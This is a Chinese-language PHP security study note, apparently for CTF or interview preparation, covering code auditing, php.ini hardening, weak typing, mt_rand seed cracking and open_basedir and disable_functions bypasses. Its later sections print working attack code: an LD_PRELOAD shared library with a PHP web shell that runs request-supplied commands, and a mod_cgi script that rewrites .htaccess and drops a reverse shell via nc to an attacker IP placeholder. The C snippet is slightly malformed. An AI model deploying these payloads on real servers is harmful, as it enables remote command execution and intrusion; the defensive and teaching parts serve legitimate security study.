---
title: PHP安全相关
---
#  PHP安全相关

# 何为代码审计？

代码审计（Code audit）是一种以发现程序错误，安全漏洞和违反程序规范为目标的源代码分析。

内容包括：

> 1. 前后台分离的运行架构
> 2. Web服务的目录权限分类
> 3. 认证会话与应用平台的结合
> 4. 数据库的配置规范
> 5. SQL语句的编写规范
> 6. Web服务的权限配置
> 7. 对抗爬虫引擎的处理措施

# 你审计的关键点？

> **！！！首先要搞清楚目录结构，程序有哪些功能，查看 config 配置文件！！！**
>
> 一、如果是CMS，搜索公开漏洞，对比同版本文件差异
>
> 二、查看敏感函数、回溯变量，判断变量在调用前是否经过安全过滤
>
> 三、查看公共函数、过滤函数是否存在漏洞和可绕过的点
>
> ​		函数命名上会包含`common`、`function`、`filter`、`safe`、`check`等关键词
>
> 四、查看敏感功能点，正向追踪变量传递过程，重点关注用户可控变量

# [参考链接](https://wooyun.js.org/drops/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8%E6%80%BB%E7%BB%93.html)

# 你用什么工具提高效率？

Fortify

**submile代码审计插件**

[VulHint](https://github.com/5alt/VulHint)

[Find-PHP-Vulnerabilities](https://github.com/WangYihang/Find-PHP-Vulnerabilities) 

# 为什么有的时候没有错误回显，用php举例

> php的配置文件php.ini进行了修改，display_errors = On 修改为 display_errors = off时候就没有报错提示。 
>
> 在php脚本开头添加error_reporting(0); 也可以达到关闭报错的作用 
>
> 除了上面的，还可以在执行语句前面添加@ 
>

# php.ini可以设置哪些安全特性

### **关闭错误回显**

防止利用错误信息反馈获取网站敏感信息

### **设置open_basedir**= /var/www/html

限制 PHP 脚本能访问的目录，一定程度下可降低Webshell的危害

### **禁用危险函数**

如果不希望执行包括`system()`等在内的执行命令的 PHP 函数

以及能够查看 PHP 信息的`phpinfo()`等函数

可以通过以下设置禁止这些函数

```php
disable_functions = phpinfo, system, passthru, exec, shell_exec, popen, escapeshellarg, escapeshellcmd, proc_close, proc_open, dl
```

### **打开magic_quotes_gpc魔术引号**

```php
magic_quotes_gpc = on
```

魔术引号自动过滤 GET/POST/COOKIE 可以防止SQL注入

但是 php<5.4不会处理$_SERVER(client-ip/referer注入)  详情参见[CVE-2012-0831](https://www.seebug.org/vuldb/ssvid-30102)

### **关闭注册全局变量**

在 PHP 环境中提交的变量，包括使用 POST 或者 GET 命令提交的变量

都将自动注册为全局变量，能够被直接访问 (PHP<5.4.0)。

这对服务器是非常不安全的，应该将注册全局变量的选项关闭，禁止将所提交的变量注册为全局变量。

```php
register_globals = off
```

### **关闭 PHP 版本信息在 HTTP 头中的泄露**

为了防止黑客获取服务器中 PHP 版本的信息，可以禁止该信息在 HTTP 头部内容中泄露

```php
expose_php = off
```

### **错误信息控制**

一般 PHP 环境在没有连接到数据库或者其他情况下会有错误提示信息

错误信息中可能包含 PHP 脚本当前的路径信息或者查询的 SQL 语句等信息

这类信息如果暴露给黑客是不安全的，应该禁止该错误提示：

```php
display_errors = Off
```

如果确实要显示错误信息，一定要设置显示错误信息的级别。

例如，只显示警告以上的错误信息：

```php
error_reporting = E_WARNING & E_ERROR
```

### **错误日志**

建议在关闭错误提示信息后，对于错误信息进行记录，便于排查服务器运行异常的原因：

```php
log_errors = On
```

同时，需要设置错误日志存放的目录，将 PHP 错误日志与 Apache 的日志存放在同一目录下：

```
error_log = /usr/local/apache2/logs/php_error.log
```

**注意**： 该文件必须设置允许 Apache 用户或用户组具有写的权限。

# PHP的 %00 截断的原理是什么？

**`存在于 < 5.3.4版本`，GPC关闭**，一般利用在对文件进行操作时，如文件上传时文件名的截断

如`filename=test.php%00.txt` 会被截断成test.php，00后面的被忽略

系统在对文件名读取时候，如果遇到0x00,就会认为读取已经结束了

> 因为PHP使用C语言编写，C语言的字符串结束标志是字符 `\0` ，它的ASCII码值是 0

# PHP弱类型

如果用`==`比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行

`0e`开头的字符串等于0

进行比较运算时，如果遇到了`0e\d+`这种字符串，就会将这种字符串解析为科学计数法  

**0e开头的MD5和原字符串（用于MD5碰撞）**

```
s878926199a
0e545993274517709034328855841020

s155964671a
0e342768416822451524974117254469

s214587387a
0e848240448830537924465865611904
```

```bash
?kekeyy1[]=xxx&kekeyy2[]=123
```

md5()函数无法处理数组，如果传入的为数组，会返回NULL

所以两个数组经过加密后得到的都是NULL,也就是相等的

**值为NULL的MD5：**

```
d41d8cd98f00b204e9800998ecf8427ed41d8cd98f00b204e9800998ecf8427e
```

**strcmp()：**需要给strcmp()传递2个string类型的参数

> 如果str1小于str2,返回-1，相等返回0，否则返回1
>
> strcmp比较出错 => 返回NULL => NULL==0 => get flag!

# 变量覆盖

**$$容易引发变量覆盖**

> $GLOBALS — 引用全局作用域中可用的全部变量		(PHP手册)

```php
$args=GLOBALS 和 var_dump($$args) 前面那个 $ 组成 $GLOBALS
```

# PHP伪随机数爆破

> 每一次调用mt_rand()函数的时候，都会检查一下系统有没有播种
>
> PHP的mt_rand()函数生成的随机数只跟seed和调用该函数的次数有关。

当得到seed数值后，就可以预测出接下来的数值是多少，这是该函数的一个问题，它并不能起到一个真随机数的作用

seed获取需要利用一个爆破工具：[https](https://github.com/lepiaf/php_mt_seed)[://github.com/](https://github.com/lepiaf/php_mt_seed)[lepiaf](https://github.com/lepiaf/php_mt_seed)[/](https://github.com/lepiaf/php_mt_seed)[php_mt_seed](https://github.com/lepiaf/php_mt_seed)

## 例题：

把题目给的生成的一组随机数的第一个数用作爆破

可能爆破出来多个种子，自己本地测试下



题目：srand.php

```php
<?php
echo "PHP 7.x";
mt_srand(xxxxxxxx);
# We can't tell you what is xxxxxxxx!
echo mt_rand()."<br/>";
echo mt_rand()."<br/>";
echo mt_rand()."<br/>";
echo mt_rand()."<br/>";
echo mt_rand()."<br/>";
echo mt_rand()."<br/>";
echo mt_rand()."<br/>";
echo mt_rand()."<br/>";
echo mt_rand()."<br/>";
echo mt_rand()."<br/>";
echo "echo flag{".mt_rand()."}"
?>
984489752
619387123
2070958802
2105559368
1909473866
1679323715
1910332168
640569646
1103001695
1871111424
flag

So, Please guess the flag!
```

```bash
./php_mt_seed 984489752
```

# 绕过Open_basedir列目录

### 1、system命令执行函数绕过

>  open_basedir 的设置对system等命令执行函数是无效的，所以可以用命令执行函数来访问限制目录

```bash
system("cat ../../../../../etc/passwd");
```

 但是命令执行函数一般都会被限制在disable_function当中，所以我们需要寻找其他的途径来绕过限制 

### 2、glob:// 数据流包装器

> glob是用来筛选目录的伪协议，筛选时不受`open_basedir`制约 

```php
if ( $b = opendir("glob:///var/www/html/*.php") ) {while ( ($file = readdir($b)) !== false ) {echo "filename:".$file."\n";}closedir($b);}
```

更多方法参见[P牛的博客](https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html)

# 绕过disable_fuction

### **利用DL()函数**

dl( ) 函数允许在php脚本里动态加载php模块，默认是加载extension_dir目录里的扩展

该选项是PHP_INI_SYSTEM范围可修改的，只能在php.ini或者apache主配置文件里修改。

也可以通过enable_dl选项来关闭动态加载功能，而这个选项默认为On的

可以用`../`这种目录遍历的方式指定加载任何一个目录里的so等扩展文件

所以我们可以上传自己的so文件，并且用dl函数加载这个so文件执行命令



### **LD_PRELOAD 环境变量**

LD_PRELOAD 是Linux的环境变量，它允许定义在程序运行前优先加载的动态链接库 

在php中，可使用putenv()函数设置LD_PRELOAD环境变量来加载指定的so文件

so文件中包含自定义函数进行劫持从而达到执行恶意命令的目的。

```c
//bypass_disablefuc.c
#define _GNU_SOURCE
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
extern char** environ;
__attribute__ ((__constructor__)) void preload (void)
{
    const char* cmdline = getenv("EVIL_CMDLINE");
    if (getenv("LD_PRELOAD") == NULL) { return 0; }
    unsetenv("LD_PRELOAD");
    system(cmdline);
    }
    system(cmdline);
}

//编译成动态链接库
gcc -shared -fPIC bypass_disablefuc.c -o bypass_disablefunc_x64.so
    
//若目标为 x86 架构，需要加上 -m32
gcc -shared -fPIC bypass_disablefuc.c -m32 -o bypass_disablefunc_x32.so
```

再写一个PHP， 用putenv添加环境变量(一个是上传的so库地址、一个是要执行的命令)。

将system命令输出内容写入指定文件，然后读出。

```php
//bypass_disablefunc.php 
<?php
 	echo "<p> <b>example</b>: http://site.com/bypass_disablefunc.php?cmd=pwd&outpath=/tmp/xx&sopath=/var/www/html/bypass_disablefunc_x64.so </p>";

	$cmd = $_REQUEST["cmd"];
   $out_path = $_REQUEST["outpath"];
   $evil_cmdline = $cmd . " > " . $out_path . " 2>&1";
   echo "<p> <b>cmdline</b>: " . $evil_cmdline . "</p>";
   putenv("EVIL_CMDLINE=" . $evil_cmdline);
   $so_path = $_REQUEST["sopath"];
   putenv("LD_PRELOAD=" . $so_path);
   mail("", "", "", "");
   echo "<p> <b>output</b>: <br />" . nl2br(file_get_contents($out_path)) . "</p>";
	unlink($out_path);
?>
```

将编译成的**动态链接库**和**php文件**上传到目标网站根目录。

```bash
#用法如下
http://xx.com/bypass_disablefunc.php?cmd=ls&outpath=/tmp/ss&sopath=/var/www/html/bypass_disablefunc_x64.so
```

> PHP 支持putenv()、mail() 即可，甚至无需安装 sendmail。 (**此方法还可用于过WAF**)

### **Fastcgi/PHP-FPM**

Fastcgi 是一种通讯协议，用于Web服务器与后端语言的数据交换；

PHP-FPM 则是php环境中对Fastcgi协议的管理程序实现

Nginx为fastcgi 提供了 fastcgi_param 来主要处理映射关系，将 Nginx 中的变量翻译成 PHP 能够理解的变量

[蚁剑扩展](https://github.com/AntSwordProject/ant_php_extension)，用相应版本php编译即可 

### **Apache Mod CGI**

Mod CGI就是把PHP做为APACHE一个内置模块，

让apache http服务器本身能够支持PHP语言，不需要每一个请求都通过启动PHP解释器来解释PHP

它可以将cgi-script文件或者用户自定义标识头为cgi-script的文件通过服务器运行

在phpinfo看到`Server API -> CGI/FastCGI`，就可以确定是以cgi模式运行的了。

**要求**

> 1. apache且运行mod_cgi模式
> 2. web目录可写
> 3. 允许.htaccess生效

在.htaccess 中添加以下内容，指定.dazzle为结尾的文件为CGI脚本程序并且允许本目录执行，我们只要同时上传一个.dazzle的shell就可以了。

```bash
Options +ExecCGI
AddHandler cgi-script .dizzle
```

现成payload - 》反弹shell：

```php
<?php
$cmd = "nc -c '/bin/bash' 攻击者IP 6666"; //command to be executed
$shellfile = "#!/bin/bash\n"; //using a shellscript
$shellfile .= "echo -ne \"Content-Type: text/html\\n\\n\"\n"; //header is needed, otherwise a 500 error is thrown when there is output
$shellfile .= "$cmd"; //executing $cmd
function checkEnabled($text,$condition,$yes,$no) //this surely can be shorter
{
    echo "$text: " . ($condition ? $yes : $no) . "<br>\n";
}
if (!isset($_GET['checked']))
{
    @file_put_contents('.htaccess', "\nSetEnv HTACCESS on", FILE_APPEND); //Append it to a .htaccess file to see whether .htaccess is allowed
    header('Location: ' . $_SERVER['PHP_SELF'] . '?checked=true'); //execute the script again to see if the htaccess test worked
}
else
{
    $modcgi = in_array('mod_cgi', apache_get_modules()); // mod_cgi enabled?
    $writable = is_writable('.'); //current dir writable?
    $htaccess = !empty($_SERVER['HTACCESS']); //htaccess enabled?
        checkEnabled("Mod-Cgi enabled",$modcgi,"Yes","No");
        checkEnabled("Is writable",$writable,"Yes","No");
        checkEnabled("htaccess working",$htaccess,"Yes","No");
    if(!($modcgi && $writable && $htaccess))
    {
        echo "Error. All of the above must be true for the script to work!"; //abort if not
    }
    else
    {
        checkEnabled("Backing up .htaccess",copy(".htaccess",".htaccess.bak"),"Suceeded! Saved in .htaccess.bak","Failed!"); //make a backup, cause you never know.
        checkEnabled("Write .htaccess file",file_put_contents('.htaccess',"Options +ExecCGI\nAddHandler cgi-script .dizzle"),"Succeeded!","Failed!"); //.dizzle is a nice extension
        checkEnabled("Write shell file",file_put_contents('shell.dizzle',$shellfile),"Succeeded!","Failed!"); //write the file
        checkEnabled("Chmod 777",chmod("shell.dizzle",0777),"Succeeded!","Failed!"); //rwx
        echo "Executing the script now. Check your listener <img src = 'shell.dizzle' style = 'display:none;'>"; //call the script
    }
}
?>
```

### [通过Antsword看绕过disable_functions](https://www.anquanke.com/post/id/195686#h3-3)

# PHP安全练习网站

https://www.ripstech.com/php-security-calendar-2017/